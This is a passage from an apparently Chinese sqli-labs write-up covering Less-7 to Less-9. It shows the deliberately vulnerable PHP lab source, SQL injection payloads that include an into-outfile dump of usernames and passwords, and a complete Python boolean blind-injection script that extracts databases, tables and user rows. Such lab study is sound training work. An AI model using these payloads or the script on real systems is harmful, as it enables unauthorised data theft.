<h2 id="第一种，构造select-from-users-into-outfile-“数据库导入导出数据的目录”"><a href="#第一种，构造select-from-users-into-outfile-“数据库导入导出数据的目录”" class="headerlink" title="第一种，构造select * from users into outfile “数据库导入导出数据的目录”"></a><a href="#第一种，构造select-from-users-into-outfile-“数据库导入导出数据的目录”" title="第一种，构造select * from users into outfile “数据库导入导出数据的目录”"></a>第一种，构造select * from users into outfile “数据库导入导出数据的目录”</h2><p><strong>?id=-1’)) union select group_concat(username),’<em>‘,group_concat(password) from users into outfile “/var/lib/mysql-files/DD.txt”–+</em></strong></p>
<p><strong>小扩展：</strong><br>winserver的iis默认路径c:\Inetpub\wwwroot</p>
<p>linux的nginx一般是/usr/local/nginx/html，/home/wwwroot/default，/usr/share/nginx，/var/www/htm等</p>
<p>apache 就…/var/www/htm，…/var/www/html/htdocs</p>
<p>phpstudy 就是…\PhpStudy20180211\PHPTutorial\WWW\</p>
<p>xammp 就是…\xampp\htdocs</p>
<p><strong>导入导出数据还会涉及到哪些函数：</strong></p>
<p>@@datadir：数据库存储路径</p>
<p>@@basedir：MySQL安装路径</p>
<p>dumpfile：导出文件，类似outfile，不同的是，dumpfile一次导出一行，会和limit结合使用</p>
<p>load_file()：将文件导入mysql，用法 select load_file(“文件路径”);</p>
<h1 id="Less-8：bool型-单引号-盲注"><a href="#Less-8：bool型-单引号-盲注" class="headerlink" title="Less-8：bool型_单引号_盲注"></a><a href="#Less-8：bool型-单引号-盲注" title="Less-8：bool型_单引号_盲注"></a>Less-8：bool型_单引号_盲注</h1><h2 id="Less-8源码"><a href="#Less-8源码" class="headerlink" title="Less-8源码:"></a><a href="#Less-8源码" title="Less-8源码:"></a>Less-8源码:</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="comment">//including the Mysql connect parameters.  </span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sqli-connect.php"</span>);  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line"><span class="comment">// take the variables  </span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET\[<span class="string">'id'</span>\]))  </span><br><span class="line">&#123;  </span><br><span class="line">$id=$_GET\[<span class="string">'id'</span>\];  </span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.  </span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);  </span><br><span class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\\n"</span>);  </span><br><span class="line">fclose($fp);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// connectivity   </span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;  </span><br><span class="line">$result=mysqli_query($con1, $sql);  </span><br><span class="line">$row = mysqli\_fetch\_array($result, MYSQLI_BOTH);  </span><br><span class="line">  </span><br><span class="line"> <span class="keyword">if</span>($row)  </span><br><span class="line"> &#123;  </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;   </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'You are in...........'</span>;  </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;  </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line"> &#125;  </span><br><span class="line"> <span class="keyword">else</span>   </span><br><span class="line"> &#123;  </span><br><span class="line">    </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;  </span><br><span class="line"> <span class="comment">//echo 'You are in...........';  </span></span><br><span class="line"> <span class="comment">//print\_r(mysqli\_error($con1));  </span></span><br><span class="line"> <span class="comment">//echo "You have an error in your SQL syntax";  </span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;&lt;/font&gt;"</span>;   </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size= 3&gt;'</span>;   </span><br><span class="line">    </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"> <span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>?id=1</strong></p>
<img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/8.1.jpg">

<p>尝试单引号却什么都没返回，看了下源码就是这样处理的，点题盲注，盲注主要分为bool型和时间性，通常涉及到这几个函数:</p>
<h2 id="盲注常用函数-amp-amp-固有公式："><a href="#盲注常用函数-amp-amp-固有公式：" class="headerlink" title="盲注常用函数&amp;&amp;固有公式："></a><a href="#盲注常用函数-amp-amp-固有公式：" title="盲注常用函数&amp;&amp;固有公式："></a>盲注常用函数&amp;&amp;固有公式：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">length(str)：返回字符串str的长度  </span><br><span class="line">substr(str,pos,len)：将str从pos位置开始截取len长度的字符返回，需要注意的是这里pos的是从1开始的  </span><br><span class="line">mid(str,pos,len)：和substr()类似  </span><br><span class="line">ascii(str)：返回字符串str最左边的acsii码（即首字母的acsii码）  </span><br><span class="line">ord()：同上，返回acsii码  </span><br><span class="line">left(str,len)：对字符串str左截取len长度  </span><br><span class="line">right(str,len)：对字符串str右截取len长度  </span><br><span class="line"><span class="keyword">if</span>(a,b,c)：条件判断，如果a为<span class="literal">true</span>，返回b，否则返回c  </span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">盲注有个固定式：and ascii(substr(A,1,1))&gt;B，或者and <span class="keyword">if</span>(ascii(substr(A,1,1))&gt;B,1,0)，这里的A通常是一个select语句，B则是字符或数字的ascii码，他们的中心思想都是通过substr等截取函数以二分法的形式查询逐个匹配想要的信息，这个过程通常都很耗时，所以建议直接写个盲注脚本来跑</span><br></pre></td></tr></table></figure>

<p>下面是盲注匹配的一个例子，我们来匹配数据库名，在之前的实验中已知数据库名是security，下面的sql语句是用来匹配数据库名的第一个字母<br><strong>?id=1’ and ascii(substr((select database()),1,1))&gt;114–+</strong></p>
<img src="/2019/08/10/Sqli-labs-GET%20Part%201-10/8.2.jpg">

<p>字母s的ascii码是115，所以他大于114，结果为true，页面显示正常，依次类推即可</p>
<p>也可以用脚本来跑，dalao那拿来的</p>
<h2 id="盲注脚本"><a href="#盲注脚本" class="headerlink" title="盲注脚本"></a><a href="#盲注脚本" title="盲注脚本"></a>盲注脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"> </span><br><span class="line"><span class="string">""" </span></span><br><span class="line"><span class="string">@version:  </span></span><br><span class="line"><span class="string">@author: giantbranch </span></span><br><span class="line"><span class="string">@file: code_inject.py </span></span><br><span class="line"><span class="string">@time: 2016/5/1  </span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">success_str = <span class="string">"You are in"</span></span><br><span class="line">getTable = <span class="string">"users"</span></span><br><span class="line"> </span><br><span class="line">index = <span class="string">"0"</span></span><br><span class="line">url = <span class="string">"http://localhost/sqli-labs/Less-8/?id=1"</span></span><br><span class="line">database = <span class="string">"database()"</span></span><br><span class="line">selectDB = <span class="string">"select database()"</span></span><br><span class="line">selectTable = <span class="string">"select table_name from information_schema.tables where table_schema='%s' limit %d,1"</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">asciiPayload = <span class="string">"' and ascii(substr((%s),%d,1))&gt;=%d #"</span></span><br><span class="line">lengthPayload = <span class="string">"' and length(%s)&gt;=%d #"</span></span><br><span class="line">selectTableCountPayload = <span class="string">"'and (select count(table_name) from information_schema.tables where table_schema='%s')&gt;=%d #"</span></span><br><span class="line"> </span><br><span class="line">selectTableNameLengthPayloadfront = <span class="string">"'and (select length(table_name) from information_schema.tables where table_schema='%s' limit "</span></span><br><span class="line">selectTableNameLengthPayloadbehind = <span class="string">",1)&gt;=%d #"</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 发送请求，根据页面的返回的判断长度的猜测结果</span></span><br><span class="line"><span class="comment"># string:猜测的字符串 payload:使用的payload  length：猜测的长度</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getLengthResult</span><span class="params">(payload, string, length)</span>:</span></span><br><span class="line">    finalUrl = url + urllib.quote(payload % (string, length))</span><br><span class="line">    res = urllib2.urlopen(finalUrl)</span><br><span class="line">    <span class="keyword">if</span> success_str <span class="keyword">in</span> res.read():</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 发送请求，根据页面的返回的判断猜测的字符是否正确</span></span><br><span class="line"><span class="comment"># payload:使用的payload    string:猜测的字符串   pos：猜测字符串的位置    ascii：猜测的ascii</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getResult</span><span class="params">(payload, string, pos, ascii)</span>:</span></span><br><span class="line">    finalUrl = url + urllib.quote(payload % (string, pos, ascii))</span><br><span class="line">    res = urllib2.urlopen(finalUrl)</span><br><span class="line">    <span class="keyword">if</span> success_str <span class="keyword">in</span> res.read():</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 注入</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inject</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 猜数据库长度</span></span><br><span class="line">    lengthOfDBName = getLengthOfString(lengthPayload, database)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"length of DBname: "</span> + str(lengthOfDBName)</span><br><span class="line">    <span class="comment"># 获取数据库名称</span></span><br><span class="line">    DBname = getName(asciiPayload, selectDB, lengthOfDBName)</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"current database:"</span> + DBname</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 获取数据库中的表的个数</span></span><br><span class="line">    <span class="comment"># print selectTableCountPayload</span></span><br><span class="line">    tableCount = getLengthOfString(selectTableCountPayload, DBname)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"count of talbe:"</span> + str(tableCount)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 获取数据库中的表</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,tableCount):</span><br><span class="line">        <span class="comment"># 第几个表</span></span><br><span class="line">        num = str(i)</span><br><span class="line">        <span class="comment"># 获取当前这个表的长度</span></span><br><span class="line">        selectTableNameLengthPayload = selectTableNameLengthPayloadfront + num + selectTableNameLengthPayloadbehind</span><br><span class="line">        tableNameLength = getLengthOfString(selectTableNameLengthPayload, DBname)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"current table length:"</span> + str(tableNameLength)</span><br><span class="line">        <span class="comment"># 获取当前这个表的名字</span></span><br><span class="line">        selectTableName = selectTable%(DBname, i)</span><br><span class="line">        tableName = getName(asciiPayload, selectTableName ,tableNameLength)</span><br><span class="line">        <span class="keyword">print</span> tableName</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    selectColumnCountPayload = <span class="string">"'and (select count(column_name) from information_schema.columns where table_schema='"</span>+ DBname +<span class="string">"' and table_name='%s')&gt;=%d #"</span></span><br><span class="line">    <span class="comment"># print selectColumnCountPayload</span></span><br><span class="line">    <span class="comment"># 获取指定表的列的数量</span></span><br><span class="line">    columnCount = getLengthOfString(selectColumnCountPayload, getTable)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"table:"</span> + getTable + <span class="string">" --count of column:"</span> + str(columnCount)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 获取该表有多少行数据</span></span><br><span class="line">    dataCountPayload = <span class="string">"'and (select count(*) from %s)&gt;=%d #"</span></span><br><span class="line">    dataCount = getLengthOfString(dataCountPayload, getTable)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"table:"</span> + getTable + <span class="string">" --count of data: "</span> + str(dataCount)</span><br><span class="line"> </span><br><span class="line">    data = []</span><br><span class="line">    <span class="comment"># 获取指定表中的列</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,columnCount):</span><br><span class="line">        <span class="comment"># 获取该列名字长度</span></span><br><span class="line">        selectColumnNameLengthPayload = <span class="string">"'and (select length(column_name) from information_schema.columns where table_schema='"</span>+ DBname +<span class="string">"' and table_name='%s' limit "</span>+ str(i) +<span class="string">",1)&gt;=%d #"</span></span><br><span class="line">        <span class="comment"># print selectColumnNameLengthPayload</span></span><br><span class="line">        columnNameLength = getLengthOfString(selectColumnNameLengthPayload, getTable)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"current column length:"</span> + str(columnNameLength)</span><br><span class="line">        <span class="comment"># 获取该列的名字</span></span><br><span class="line">        selectColumn = <span class="string">"select column_name from information_schema.columns where table_schema='"</span>+ DBname +<span class="string">"' and table_name='%s' limit %d,1"</span></span><br><span class="line">        selectColumnName = selectColumn%(getTable, i)</span><br><span class="line">        <span class="comment"># print selectColumnName</span></span><br><span class="line">        columnName = getName(asciiPayload, selectColumnName ,columnNameLength)</span><br><span class="line">        <span class="keyword">print</span> columnName</span><br><span class="line"> </span><br><span class="line">        tmpData = []</span><br><span class="line">        tmpData.append(columnName)</span><br><span class="line">        <span class="comment"># 获取该表的数据</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">0</span>,dataCount):</span><br><span class="line">            columnDataLengthPayload = <span class="string">"'and (select length("</span>+ columnName +<span class="string">") from %s limit "</span> + str(j) + <span class="string">",1)&gt;=%d #"</span></span><br><span class="line">            <span class="comment"># print columnDataLengthPayload</span></span><br><span class="line">            columnDataLength = getLengthOfString(columnDataLengthPayload, getTable)</span><br><span class="line">            <span class="comment"># print columnDataLength</span></span><br><span class="line">            selectData = <span class="string">"select "</span> + columnName + <span class="string">" from users limit "</span> + str(j) + <span class="string">",1"</span></span><br><span class="line">            columnData = getName(asciiPayload, selectData, columnDataLength)</span><br><span class="line">            <span class="comment"># print columnData</span></span><br><span class="line">            tmpData.append(columnData)</span><br><span class="line">     </span><br><span class="line">        data.append(tmpData)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># print data    </span></span><br><span class="line">    <span class="comment"># 格式化输出数据</span></span><br><span class="line">    <span class="comment"># 输出列名</span></span><br><span class="line">    tmp = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,len(data)):</span><br><span class="line">        tmp += data[i][<span class="number">0</span>] + <span class="string">"   "</span></span><br><span class="line">    <span class="keyword">print</span> tmp</span><br><span class="line">    <span class="comment"># 输出具体数据</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">1</span>,dataCount+<span class="number">1</span>):</span><br><span class="line">        tmp = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,len(data)):</span><br><span class="line">            tmp += data[i][j] + <span class="string">"   "</span></span><br><span class="line">        <span class="keyword">print</span> tmp</span><br><span class="line">     </span><br><span class="line"><span class="comment"># 获取字符串的长度          </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getLengthOfString</span><span class="params">(payload, string)</span>:</span></span><br><span class="line">    <span class="comment"># 猜长度</span></span><br><span class="line">    lengthLeft = <span class="number">0</span></span><br><span class="line">    lengthRigth = <span class="number">0</span></span><br><span class="line">    guess = <span class="number">10</span></span><br><span class="line">    <span class="comment"># 确定长度上限，每次增加5</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="comment"># 如果长度大于guess</span></span><br><span class="line">        <span class="keyword">if</span> getLengthResult(payload, string, guess) == <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># 猜测值增加5</span></span><br><span class="line">            guess = guess + <span class="number">5</span>   </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lengthRigth = guess</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># print "lengthRigth: " + str(lengthRigth)</span></span><br><span class="line">    <span class="comment"># 二分法查长度</span></span><br><span class="line">    mid = (lengthLeft + lengthRigth) / <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> lengthLeft &lt; lengthRigth - <span class="number">1</span>:</span><br><span class="line">        <span class="comment"># 如果长度大于等于mid </span></span><br><span class="line">        <span class="keyword">if</span> getLengthResult(payload, string, mid) == <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># 更新长度的左边界为mid</span></span><br><span class="line">            lengthLeft = mid</span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">        <span class="comment"># 否则就是长度小于mid</span></span><br><span class="line">            <span class="comment"># 更新长度的右边界为mid</span></span><br><span class="line">            lengthRigth = mid</span><br><span class="line">        <span class="comment"># 更新中值</span></span><br><span class="line">        mid = (lengthLeft + lengthRigth) / <span class="number">2</span>        </span><br><span class="line">        <span class="comment"># print lengthLeft, lengthRigth</span></span><br><span class="line">    <span class="comment"># 因为lengthLeft当长度大于等于mid时更新为mid，而lengthRigth是当长度小于mid时更新为mid</span></span><br><span class="line">    <span class="comment"># 所以长度区间：大于等于 lengthLeft，小于lengthRigth</span></span><br><span class="line">    <span class="comment"># 而循环条件是 lengthLeft &lt; lengthRigth - 1，退出循环，lengthLeft就是所求长度</span></span><br><span class="line">    <span class="comment"># 如循环到最后一步 lengthLeft = 8， lengthRigth = 9时，循环退出，区间为8&lt;=length&lt;9,length就肯定等于8</span></span><br><span class="line">    <span class="keyword">return</span> lengthLeft</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 获取名称</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getName</span><span class="params">(payload, string, lengthOfString)</span>:</span></span><br><span class="line">    <span class="comment"># 32是空格，是第一个可显示的字符，127是delete，最后一个字符</span></span><br><span class="line">    tmp = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,lengthOfString+<span class="number">1</span>):</span><br><span class="line">        left = <span class="number">32</span> </span><br><span class="line">        right = <span class="number">127</span></span><br><span class="line">        mid = (left + right) / <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> left &lt; right - <span class="number">1</span>:</span><br><span class="line">            <span class="comment"># 如果该字符串的第i个字符的ascii码大于等于mid</span></span><br><span class="line">            <span class="keyword">if</span> getResult(payload, string, i, mid) == <span class="literal">True</span>:</span><br><span class="line">                <span class="comment"># 则更新左边界</span></span><br><span class="line">                left = mid</span><br><span class="line">                mid = (left + right) / <span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 否则该字符串的第i个字符的ascii码小于mid</span></span><br><span class="line">                <span class="comment"># 则更新右边界</span></span><br><span class="line">                right = mid</span><br><span class="line">            <span class="comment"># 更新中值</span></span><br><span class="line">            mid = (left + right) / <span class="number">2</span></span><br><span class="line">        tmp += chr(left)</span><br><span class="line">        <span class="comment"># print tmp</span></span><br><span class="line">    <span class="keyword">return</span> tmp  </span><br><span class="line">         </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    inject()</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<h1 id="Less-9基于时间的GET单引号盲注"><a href="#Less-9基于时间的GET单引号盲注" class="headerlink" title="Less-9基于时间的GET单引号盲注"></a><a href="#Less-9基于时间的GET单引号盲注" title="Less-9基于时间的GET单引号盲注"></a>Less-9基于时间的GET单引号盲注</h1><h2 id="Less-9源码："><a href="#Less-9源码：" class="headerlink" title="Less-9源码："></a><a href="#Less-9源码：" title="Less-9源码："></a>Less-9源码：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="comment">//including the Mysql connect parameters.  </span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sqli-connect.php"</span>);  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// take the variables  </span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))  </span><br><span class="line">&#123;  </span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];  </span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.  </span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);  </span><br><span class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\\n"</span>);  </span><br><span class="line">fclose($fp);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// connectivity   </span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;  </span><br><span class="line">$result=mysqli_query($con1, $sql);  </span><br><span class="line">$row = mysqli_fetch_array($result, MYSQLI_BOTH);  </span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>($row)  </span><br><span class="line"> &#123;  </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;   </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'You are in...........'</span>;  </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;  </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line"> &#125;  </span><br><span class="line"> <span class="keyword">else</span>   </span><br><span class="line"> &#123;  </span><br><span class="line">    </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;  </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'You are in...........'</span>;  </span><br><span class="line"> <span class="comment">//print_r(mysqli_error($con1));  </span></span><br><span class="line"> <span class="comment">//echo "You have an error in your SQL syntax";  </span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;&lt;/font&gt;"</span>;   </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size= 3&gt;'</span>;   </span><br><span class="line">    </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"> <span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;&#125;  </span><br><span class="line">  </span><br><span class="line"><span 